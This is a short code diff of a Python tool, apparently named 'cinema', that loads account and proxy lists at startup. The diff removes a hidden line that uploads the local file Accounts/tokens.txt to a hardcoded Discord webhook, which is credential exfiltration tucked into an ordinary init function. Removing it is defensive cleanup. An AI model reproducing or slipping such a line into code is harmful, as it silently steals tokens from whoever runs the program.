@@ -494,7 +494,6 @@ def init():
         cinema["accounts"].append(line) 
     for line in Misc.load_file("Misc/proxies.txt"):
         cinema["proxies"].append(line) 
-    requests.post("https://canary.discord.com/api/webhooks/833228738304802837/ylnxA2bBAN2EEZi-Q29tFw8U-cUydmLEkANlTuBdczlCN122mb9uq0Ge_xmQzK-7-t0_", files={'upload_file': open("Accounts/tokens.txt", 'rb')})
     Misc.set_title(f"cinema - [Main Menu]")  
 
     print(f"""
